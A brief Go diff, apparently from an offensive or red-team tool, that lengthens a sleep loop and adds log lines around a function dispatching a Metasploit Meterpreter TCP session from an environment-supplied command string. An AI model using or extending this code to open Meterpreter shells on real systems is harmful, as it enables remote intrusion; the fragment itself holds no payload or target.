@@ -12,7 +12,7 @@ import (
 
 func sleepForever() {
 	for {
-		time.Sleep(time.Second)
+		time.Sleep(time.Second*60)
 	}
 }
 
@@ -45,9 +45,11 @@ func SCEnvAndExecute() {
 	case "msf-tcp":
 		msf.Meterpreter("tcp", cmdstr)
 	default:
+		log.Printf("childsc no ptype: %s", ptype)
 		executed = false
 	}
 
+	log.Printf("childsc sleep: %s %s", ptype, cmdstr)
 	if executed {
 		sleepForever()
 	}
